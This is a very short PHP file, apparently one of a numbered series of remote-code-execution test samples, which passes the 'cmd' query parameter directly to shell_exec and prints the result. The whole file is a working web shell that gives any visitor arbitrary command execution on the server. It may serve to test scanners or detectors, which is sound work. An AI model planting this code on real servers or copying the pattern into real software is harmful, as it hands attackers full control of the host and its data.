<?php
// RCE test variation #530
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>